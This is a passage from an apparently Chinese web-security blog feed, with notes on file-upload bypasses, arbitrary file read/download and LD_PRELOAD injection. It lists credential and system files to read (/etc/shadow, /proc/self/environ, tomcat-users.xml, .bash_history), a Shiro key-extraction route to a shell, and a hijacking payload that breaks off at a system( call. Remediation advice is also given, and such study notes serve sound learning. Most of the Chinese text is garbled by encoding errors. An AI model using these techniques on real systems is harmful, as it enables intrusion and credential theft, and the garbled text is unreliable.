ä¸Šå»äº†ï¼Œä½†æ˜¯æ²¡æœ‰è¿”å›è·¯å¾„ï¼Œé‚£ä¹ˆæƒ³åŠæ³•è®©ä»–åœ¨åŠ è½½ä¸€éï¼Œæ¯”å¦‚é€€å‡ºé‡æ–°ç™»é™†ï¼Œä¸€ä¸ªåŒ…ä¸€ä¸ªåŒ…çš„æ”¾ã€‚å¯èƒ½æœ‰äº›åŒ…çš„å“åº”ä¸­å°±åŒ…å«è·¯å¾„ã€‚</p><p>   å¦å¤–å¯èƒ½å­˜åœ¨å…¶ä»–æœåŠ¡å™¨ã€æˆ–è€…å…¶ä»–ç«™ç‚¹çš„å…¶ä»–è·¯å¾„ï¼Œä¹Ÿæ˜¯æŠ“åŒ…æŸ¥çœ‹ï¼Œçœ‹ä¸€ä¸‹åŠ è½½è¿‡ç¨‹çš„è·¯å¾„åœ¨å“ªæˆ–è€…çœ‹ä¸€ä¸‹htmlã€js</p><p>[<img src="/../images/1964477-20210910165949941-1026982801.png" alt="img"></p></li><li><p><strong>å°è¯•è®¿é—®æ—¥å¿—æ–‡ä»¶ï¼Œçœ‹èƒ½å¦å‘ç°ä¸€äº›æ•æ„Ÿç›®å½•æˆ–ä¸Šä¼ ç›®å½•</strong></p></li><li><p><strong>åªè¿”å›äº†æ–‡ä»¶åï¼Œæ²¡æœ‰è·¯å¾„</strong></p><p>ä¸€ç§æ˜¯fuzzï¼Œçœ‹å…¶ä»–åŒç±»å‹æ–‡ä»¶çš„è·¯å¾„ï¼Œf12æˆ–è€…å¦‚æœæœ‰æ–‡ä»¶ä¸‹è½½çš„åœ°æ–¹ï¼Œä¸‹è½½æŠ“åŒ…ï¼Œçœ‹æ–‡ä»¶åœ°å€ã€‚</p><p>å¦ä¸€ç§æ˜¯ å°è¯•ä¸Šä¼ çš„æ—¶å€™<strong>ç›®å½•ç©¿è¶Š</strong>ï¼Œä¸€æ¬¡ä¸€æ¬¡å°è¯•ï¼Œçœ‹èƒ½å¦<strong>ç©¿åˆ°ç«™ç‚¹æ ¹ç›®å½•</strong>æˆ–è€…<strong>çŸ¥é“çš„ç›®å½•ä¸‹é¢</strong>ã€‚ä¿®æ”¹è¡¨å•çš„å…¶ä»–å‚æ•°ã€æˆ–è€…filenameå‚æ•°çš„å€¼</p></li></ul><h3 id="è„šæœ¬æ–‡ä»¶è®¿é—®403"><a href="#è„šæœ¬æ–‡ä»¶è®¿é—®403" class="headerlink" title="è„šæœ¬æ–‡ä»¶è®¿é—®403"></a>è„šæœ¬æ–‡ä»¶è®¿é—®403</h3><ul><li>å°è¯•å…¶ä»–åç¼€</li><li>å…æ€</li></ul><h3 id="æ²¡æœ‰æ‰§è¡Œæƒé™"><a href="#æ²¡æœ‰æ‰§è¡Œæƒé™" class="headerlink" title="æ²¡æœ‰æ‰§è¡Œæƒé™"></a>æ²¡æœ‰æ‰§è¡Œæƒé™</h3><p>è¡¨ç°ï¼šè®¿é—®æ—¶æ–‡ä»¶ç›´æ¥ä¸‹è½½</p><p>å°è¯•ç›®å½•ç©¿è¶Šï¼Œè·³åˆ°å¯ä»¥æ‰§è¡Œè„šæœ¬è¯­è¨€çš„ç›®å½•</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line">///../../../</span><br></pre></td></tr></table></figure><blockquote><p>ä»¥&#x2F;&#x2F;&#x2F;å¼€å¤´æ˜¯å› ä¸ºå¯èƒ½ä¼šè½¬ç ï¼Œå¯¼è‡´å†™å…¥å¤±è´¥</p></blockquote><h3 id="æ–‡ä»¶å†…å®¹å’Œæµé‡æ£€æµ‹"><a href="#æ–‡ä»¶å†…å®¹å’Œæµé‡æ£€æµ‹" class="headerlink" title="æ–‡ä»¶å†…å®¹å’Œæµé‡æ£€æµ‹"></a>æ–‡ä»¶å†…å®¹å’Œæµé‡æ£€æµ‹</h3><ul><li>å…æ€</li><li>é€šä¿¡åŠ å¯†</li></ul><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ul><li><p>ç™½åå•æœºåˆ¶</p></li><li><p>ä¸Šä¼ æ–‡ä»¶é‡å‘½å</p></li><li><p>éšè—ä¸Šä¼ æ–‡ä»¶è·¯å¾„</p></li><li><p>æ–‡ä»¶å†…å®¹æ ¡éªŒå’Œè¿‡æ»¤</p></li><li><p>é¿å…æ¡ä»¶ç«äº‰ï¼Œå…ˆåˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œè€Œä¸æ˜¯å…ˆå°†æ–‡ä»¶å†™å…¥å†åˆ¤æ–­æ˜¯å¦åˆæ³•</p></li><li><p>ä¸Šä¼ çš„æ–‡ä»¶ç»Ÿä¸€æ”¾åˆ°ä¸€ä¸ªåœ°æ–¹ï¼Œéµå¾ªä»¥ä¸‹åŸåˆ™</p><p><code>ç›®å½•å¯å†™ä½†ä¸å¯è§£æï¼Œå¯è§£æä½†ä¸å¯å†™å…¥</code></p><p>æˆ–è€…ä¸Šä¼ åˆ°ä¸“é—¨ç”¨æ¥ä¿å­˜æ–‡ä»¶çš„åœ°æ–¹ï¼Œå¦‚å­˜å‚¨OSS</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ä»»æ„æ–‡ä»¶è¯»å–å’Œä¸‹è½½</title>
      <link href="/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/"/>
      <url>/2023/05/31/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E5%92%8C%E4%B8%8B%E8%BD%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h1><p>ä¸€äº›ç½‘ç«™ç”±äºä¸šåŠ¡éœ€è¦ï¼Œå¯èƒ½æä¾›æ–‡ä»¶æŸ¥çœ‹æˆ–ä¸‹è½½çš„åŠŸèƒ½ï¼Œå¦‚æœå¯¹ç”¨æˆ·æŸ¥çœ‹æˆ–ä¸‹è½½çš„æ–‡ä»¶ä¸åšé™åˆ¶ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿé€šè¿‡å›æº¯ç¬¦<code>../</code>æˆ–<code>ç»å¯¹è·¯å¾„</code>è·³è½¬åˆ°ä»»æ„ç›®å½•æŸ¥çœ‹æˆ–ä¸‹è½½ä»»æ„çš„æ–‡ä»¶ï¼›è¿™å¯èƒ½æ˜¯ä»£ç æºæ–‡ä»¶ï¼Œæ•æ„Ÿé…ç½®æ–‡ä»¶ç­‰ç­‰ï¼Œåœ¨ç‰¹å®šçš„åœºæ™¯ä¸‹ï¼Œè¿˜å¯èƒ½é€ æˆSSRFæ¼æ´ã€‚</p><h1 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h1><p><img src="/../images/qcLDlsYeCB1V6EK.png" alt="image-20220112103936559"></p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p><a href="https://wsygoogol.github.io/2017/01/27/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8/">ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´çš„åˆ©ç”¨ | SY0Uâ€™s Blog (wsygoogol.github.io)</a></p><p><a href="https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/07.%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD:%E8%AF%BB%E5%8F%96/#windows">07.ä»»æ„æ–‡ä»¶ä¸‹è½½:è¯»å– Â· d4m1ts çŸ¥è¯†åº“ (gm7.org)</a></p><p>åˆ¤æ–­æ“ä½œç³»ç»Ÿ</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">C:/windows/win.ini</span><br></pre></td></tr></table></figure><p>æµ‹è¯•æƒé™</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Linux: /etc/shadow</span><br><span class="line">Windows: </span><br></pre></td></tr></table></figure><p>è¯»å–</p><ul><li><p>ç½‘ç«™æºç å®¡è®¡</p></li><li><p>é…ç½®æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ•°æ®åº“</span><br><span class="line">ä¸­é—´ä»¶</span><br><span class="line">åç«¯è¯­è¨€</span><br><span class="line">ssh</span><br><span class="line">ftp</span><br></pre></td></tr></table></figure></li><li><p>æ—¥å¿—æ–‡ä»¶</p></li><li><p>æ•æ„Ÿä¿¡æ¯æ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellå†å²å‘½ä»¤</span><br><span class="line">çˆ†ç ´æ¡Œé¢ä¸Šçš„æ–‡ä»¶</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th align="center">ä¸­é—´ä»¶</th><th align="center">é…ç½® æ–‡ä»¶ç›®å½•</th><th align="center">ä¸»é…ç½®æ–‡ä»¶</th><th align="center">ç½‘ç«™ç›®å½•</th><th align="center">æ—¥å¿—ç›®å½•</th></tr></thead><tbody><tr><td align="center">nginx</td><td align="center">&#x2F;etc&#x2F;nginx&#x2F;</td><td align="center">nginx.conf</td><td align="center">&#x2F;usr&#x2F;share&#x2F;nginx&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;nginx&#x2F;</td></tr><tr><td align="center">apache</td><td align="center">&#x2F;etc&#x2F;apache2&#x2F;</td><td align="center">apache2.conf</td><td align="center">&#x2F;var&#x2F;www&#x2F;html&#x2F;</td><td align="center">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;</td></tr><tr><td align="center">tomcat</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;conf</td><td align="center">å¦‚ä¸‹å›¾</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;webapps</td><td align="center">&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;log</td></tr></tbody></table><p><img src="/../images/image-20230301144917539-1686983536199.png" alt="image-20230301144917539"></p><ul><li><p>javaç«™ç‚¹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/WEB-INF/web.xml</span><br><span class="line">/WEB-INF/classes/applicationContext.xml</span><br><span class="line">/WEB-INF/classes/xxx/xxx/xxx.class</span><br><span class="line">core.jar</span><br></pre></td></tr></table></figure><blockquote><p>å¦‚æœé‡åˆ°Shiroç«™ç‚¹ï¼Œå¯ä»¥ç›´æ¥åˆ©ç”¨å…¨è·¯å¾„æ‰¾åˆ°core.jarï¼Œå»ä¸‹è½½core.jarï¼Œä¸‹è½½ååç¼–è¯‘æœç´¢<code>Base64.decode</code>ç›´æ¥æ‰¾keyï¼Œè¿›è€Œgetshell</p></blockquote></li><li><p>tomcat</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/local/tomcat/conf/tomcat-users.xml</span><br></pre></td></tr></table></figure></li><li><p>nginx</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/www/nginx/conf/nginx.conf</span><br><span class="line">/etc/nginx/nginx.conf</span><br><span class="line">/usr/local/nginx/conf/nginx.conf</span><br><span class="line">/usr/local/etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure></li><li><p>apache</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/httpd/conf/httpd.conf</span><br><span class="line">/etc/apache2/apache2.conf</span><br><span class="line">/etc/apache2/httpd.conf</span><br></pre></td></tr></table></figure></li><li><p>redis<br><code>/etc/redis.conf</code></p></li><li><p>ssh<br><code>/etc/ssh/sshd_config</code></p></li></ul><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><h4 id="x2F-etc-ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•"><a href="#x2F-etc-ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•" class="headerlink" title="&#x2F;etc ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•"></a><strong>&#x2F;etc ç³»ç»Ÿé…ç½®æ–‡ä»¶ç›®å½•</strong></h4><ul><li><p>&#x2F;etc&#x2F;passwd</p><p>è®°å½•ç”¨æˆ·ä¿¡æ¯</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@izwz99bgx9y93dmv0mir0ez ~]# cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin</span><br><span class="line">tcpdump:x:72:72::/:/sbin/nologin</span><br><span class="line">....</span><br><span class="line">å…è®¸ç™»å…¥çš„shellå°±æ˜¯/bin/bashç¦æ­¢shellç™»å…¥å°±æ˜¯/sbin/nologin</span><br></pre></td></tr></table></figure><ul><li><p>æ ¼å¼è§£æ</p><p>ä»¥:ä½œä¸ºåˆ†éš”ç¬¦<br>ç™»å½•å:åŠ å¯†çš„å£ä»¤:UID:GID:ç”¨æˆ·ä¿¡æ¯:ç”¨æˆ·ç›®å½•:ç”¨æˆ·ç™»é™†åä½¿ç”¨çš„shell</p></li><li><p>ä¸ºä»€ä¹ˆæœ‰äº›ç™»å½•åæ˜¯æœåŠ¡è¿›ç¨‹åï¼Ÿ</p><blockquote><p>Linuxç³»ç»Ÿä¼šä¸ºå„ç§å„æ ·çš„åŠŸèƒ½åˆ›å»ºä¸åŒçš„ç”¨æˆ·è´¦æˆ·ï¼Œè€Œè¿™äº›è´¦æˆ·å¹¶ä¸æ˜¯çœŸçš„ç”¨æˆ·ã€‚</p><p>è¿™äº›è´¦æˆ·å«ä½œç³»ç»Ÿè´¦æˆ·ï¼Œæ˜¯ç³»ç»Ÿä¸Šè¿è¡Œçš„å„ç§æœåŠ¡è¿›ç¨‹è®¿é—®èµ„æºç”¨çš„ç‰¹æ®Šè´¦æˆ·ã€‚</p><p>æ¯”å¦‚ä¸Šè¿°çš„ftpï¼Œtcpdumpã€‚</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆè¦è¿™æ ·åšï¼Ÿ</p><blockquote><p>åœ¨å®‰å…¨æˆä¸ºä¸€ä¸ªå¤§é—®é¢˜ä¹‹å‰ï¼Œè¿™äº›æœåŠ¡ç»å¸¸ä¼šç”¨rootè´¦æˆ·ç™»å½•ã€‚é—æ†¾çš„æ˜¯ï¼Œå¦‚æœæœ‰éæˆæƒçš„ç”¨æˆ·æ”»é™·äº†è¿™äº›æœåŠ¡ä¸­çš„ä¸€ä¸ªï¼Œä»–ç«‹åˆ»å°±èƒ½ä½œä¸ºrootç”¨æˆ·è¿›å…¥ç³»ç»Ÿã€‚ä¸ºäº†é˜²æ­¢å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œç°åœ¨è¿è¡Œåœ¨LinuxæœåŠ¡å™¨åå°çš„å‡ ä¹æ‰€æœ‰çš„æœåŠ¡éƒ½æ˜¯ç”¨è‡ªå·±çš„è´¦æˆ·ç™»å½•ã€‚è¿™æ ·çš„è¯ï¼Œå³ä½¿æœ‰äººæ”»å…¥äº†æŸä¸ªæœåŠ¡ï¼Œä¹Ÿæ— æ³•è®¿é—®æ•´ä¸ªç³»ç»Ÿã€‚</p></blockquote></li><li><p>ä¸ºä»€ä¹ˆå¯†ç éƒ½æ˜¯X</p><blockquote><p>é‰´äºå¾ˆå¤šç¨‹åºéƒ½éœ€è¦è®¿é—®etc&#x2F;passwdæ–‡ä»¶è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™å°±æˆäº†ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚</p><p>ç»å¤§å¤šæ•°Linuxç³»ç»Ÿéƒ½å°†ç”¨æˆ·å¯†ç ä¿å­˜åœ¨å¦ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ˆå«ä½œshadowæ–‡ä»¶ï¼Œä½ç½®</p><p>åœ¨&#x2F;etc&#x2F;shadowï¼‰ã€‚åªæœ‰ç‰¹å®šçš„ç¨‹åºï¼ˆæ¯”å¦‚ç™»å½•ç¨‹åºï¼‰æ‰èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶</p></blockquote></li></ul></li><li><p>&#x2F;etc&#x2F;shadow</p><blockquote><p>&#x2F;etc&#x2F;shadowæ–‡ä»¶å¯¹Linuxç³»ç»Ÿå¯†ç ç®¡ç†æä¾›äº†æ›´å¤šçš„æ§åˆ¶ã€‚åªæœ‰rootç”¨æˆ·æ‰èƒ½è®¿é—®&#x2F;etc&#x2F;shadow</p><p>æ–‡ä»¶ï¼Œè¿™è®©å®ƒæ¯”èµ·&#x2F;etc&#x2F;passwdå®‰å…¨è®¸å¤šã€‚</p></blockquote></li><li><p>&#x2F;sys&#x2F;class&#x2F;net&#x2F;eth0&#x2F;address</p><p>macåœ°å€</p></li></ul><h4 id="å†…ç½‘æ¢æµ‹"><a href="#å†…ç½‘æ¢æµ‹" class="headerlink" title="å†…ç½‘æ¢æµ‹"></a>å†…ç½‘æ¢æµ‹</h4><p>æ–‡ä»¶å†…å®¹è§£é‡Š<a href="https://blog.csdn.net/weichanghu_/article/details/80073959">https://blog.csdn.net/weichanghu_/article/details/80073959</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/hostsï¼šè®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå</span><br><span class="line">/proc/net/arpï¼šè®°å½•ä¸»æœºipå’Œmacï¼Ÿï¼ˆarpåè®®ï¼‰</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/dev</span><br><span class="line">/proc/net/fib_trie</span><br></pre></td></tr></table></figure><h4 id="å‘½ä»¤å†å²æ“ä½œ"><a href="#å‘½ä»¤å†å²æ“ä½œ" class="headerlink" title="å‘½ä»¤å†å²æ“ä½œ"></a>å‘½ä»¤å†å²æ“ä½œ</h4><p><a href="https://blog.csdn.net/u011479200/article/details/86501366">Linux| ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHeçš„åšå®¢-CSDNåšå®¢_bash_history</a></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/home/ç”¨æˆ·å/.bash_historyï¼š ä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤</span><br></pre></td></tr></table></figure><blockquote><p>å‘½ä»¤å†å²è®°å½•è¢«ä¿å­˜åœ¨éšè—æ–‡ä»¶.bash_historyä¸­ï¼Œå®ƒä½äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸­ã€‚</p><p>è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œbashå‘½ä»¤çš„å†å²è®°å½•æ˜¯å…ˆå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå½“shellé€€å‡ºæ—¶æ‰è¢«å†™å…¥åˆ°å†å²æ–‡ä»¶ä¸­ã€‚</p></blockquote><p>rootç”¨æˆ·å¯ä»¥é€šè¿‡<code>history</code>å‘½ä»¤æŸ¥çœ‹</p><p><img src="/../images/image-20220923180951946-1686983536198.png" alt="image-20220923180951946"></p><h4 id="x2F-procç›®å½•"><a href="#x2F-procç›®å½•" class="headerlink" title="&#x2F;procç›®å½•"></a>&#x2F;procç›®å½•</h4><blockquote><p>&#x2F;proc æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚</p></blockquote><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline</span><br><span class="line">/proc/self/cwd</span><br><span class="line">/proc/self/exe</span><br><span class="line">/proc/self/environ</span><br><span class="line">/proc/self/mounts</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">çˆ†ç ´</span></span><br><span class="line">/proc/pid/fd</span><br><span class="line">/proc/?/fd  # ä½¿ç”¨é€šé…ç¬¦åŒ¹é…</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self/cmdline è·å–å¯åŠ¨jaråŒ…çš„å‘½ä»¤ï¼Œä»è€ŒçŸ¥é“webè·¯å¾„</span><br></pre></td></tr></table></figure><h5 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h5><blockquote><ol><li><strong>åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ &#x2F;proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚</strong></li><li><strong><code>/proc/self</code>åœ¨ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ–è€…SSTIä½¿ç”¨fileæ¨¡å—è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–&#x2F;proc&#x2F;self&#x2F;cmdlineã€‚</strong></li></ol></blockquote><h1 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h1><ol><li>åœ¨é…ç½®æ–‡ä»¶ä¸­é™åˆ¶è®¿é—®çš„æ–‡ä»¶ç›®å½•</li><li>æ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼Œè¿‡æ»¤æˆ–è½¬ä¹‰å«æœ‰<code>../</code>ã€<code>..\</code>ã€<code>%00</code>ï¼Œ<code>..</code>ï¼Œ<code>./</code>ï¼Œ<code>#</code>ç­‰è·³è½¬ç›®å½•æˆ–å­—ç¬¦ç»ˆæ­¢ç¬¦ã€æˆªæ–­å­—ç¬¦çš„è¾“å…¥</li><li>ä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥å­—ç¬¦çš„åˆæ³•æ€§ï¼Œæ¯”å¦‚æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶åœ°å€ã€æ–‡ä»¶å†…å®¹ç­‰</li><li>ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„ç›®å½•ã€è·¯å¾„ã€åç§°</li><li>ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„åç¼€å¦‚jpgã€gifã€pngã€rarã€zipã€pdfã€docã€xlsã€pptç­‰</li></ol>]]></content>
      
      
      <categories>
          
          <category> Webå®‰å…¨ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ç¯å¢ƒå˜é‡æ³¨å…¥</title>
      <link href="/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/"/>
      <url>/2023/05/31/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="æ¦‚å¿µ"><a href="#æ¦‚å¿µ" class="headerlink" title="æ¦‚å¿µ"></a>æ¦‚å¿µ</h1><blockquote><p>LD_PRELOAD æ˜¯ Linux ç³»ç»Ÿä¸­çš„ä¸€ä¸ªç¯å¢ƒå˜é‡ï¼Œå®ƒå¯ä»¥å½±å“ç¨‹åºçš„è¿è¡Œæ—¶çš„é“¾æ¥ï¼ˆRuntime linkerï¼‰ï¼Œå®ƒå…è®¸ä½ å®šä¹‰åœ¨ç¨‹åºè¿è¡Œå‰ä¼˜å…ˆåŠ è½½çš„åŠ¨æ€é“¾æ¥åº“ã€‚è¿™ä¸ªåŠŸèƒ½ä¸»è¦å°±æ˜¯ç”¨æ¥æœ‰é€‰æ‹©æ€§çš„è½½å…¥ä¸åŒåŠ¨æ€é“¾æ¥åº“ä¸­çš„ç›¸åŒå‡½æ•°ã€‚é€šè¿‡è¿™ä¸ªç¯å¢ƒå˜é‡ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸»ç¨‹åºå’Œå…¶åŠ¨æ€é“¾æ¥åº“çš„ä¸­é—´åŠ è½½åˆ«çš„åŠ¨æ€é“¾æ¥åº“ï¼Œç”šè‡³è¦†ç›–æ­£å¸¸çš„å‡½æ•°åº“ã€‚ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥ä»¥æ­¤åŠŸèƒ½æ¥ä½¿ç”¨è‡ªå·±çš„æˆ–æ˜¯æ›´å¥½çš„å‡½æ•°ï¼ˆæ— éœ€åˆ«äººçš„æºç ï¼‰ï¼Œè€Œå¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä»¥å‘åˆ«äººçš„ç¨‹åºæ³¨å…¥ç¨‹åºï¼Œä»è€Œè¾¾åˆ°ç‰¹å®šçš„ç›®çš„ã€‚</p></blockquote><p>å…·ä½“çš„æ“ä½œæ­¥éª¤å¦‚ä¸‹ï¼š</p><ol><li>å®šä¹‰ä¸ç›®æ ‡å‡½æ•°å®Œå…¨ä¸€æ ·çš„å‡½æ•°ï¼ŒåŒ…æ‹¬åç§°ã€å˜é‡åŠç±»å‹ã€è¿”å›å€¼åŠç±»å‹ç­‰ã€‚</li><li>å°†åŒ…å«æ›¿æ¢å‡½æ•°çš„æºç ç¼–è¯‘ä¸ºåŠ¨æ€é“¾æ¥åº“ã€‚</li><li>é€šè¿‡å‘½ä»¤ <code>export LD_PRELOAD=&quot;åº“æ–‡ä»¶è·¯å¾„&quot;</code>ï¼Œè®¾ç½®è¦ä¼˜å…ˆæ›¿æ¢åŠ¨æ€é“¾æ¥åº“å³å¯ã€‚</li><li>æ›¿æ¢ç»“æŸï¼Œè¦è¿˜åŸå‡½æ•°è°ƒç”¨å…³ç³»ï¼Œç”¨å‘½ä»¤<code>unset LD_PRELOAD</code> è§£é™¤</li></ol><h1 id="ä¾‹å­"><a href="#ä¾‹å­" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h1><h2 id="åŠ«æŒlså‘½ä»¤"><a href="#åŠ«æŒlså‘½ä»¤" class="headerlink" title="åŠ«æŒlså‘½ä»¤"></a>åŠ«æŒlså‘½ä»¤</h2><p>æŸ¥æ‰¾lså‘½ä»¤æ‰§è¡Œæ—¶è°ƒç”¨çš„ç³»ç»Ÿå‡½æ•°ï¼Œä¾‹å¦‚è°ƒç”¨äº†<code>strncmp</code></p><p>payload</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> &#123;</span><br><span class="line">    system(<span 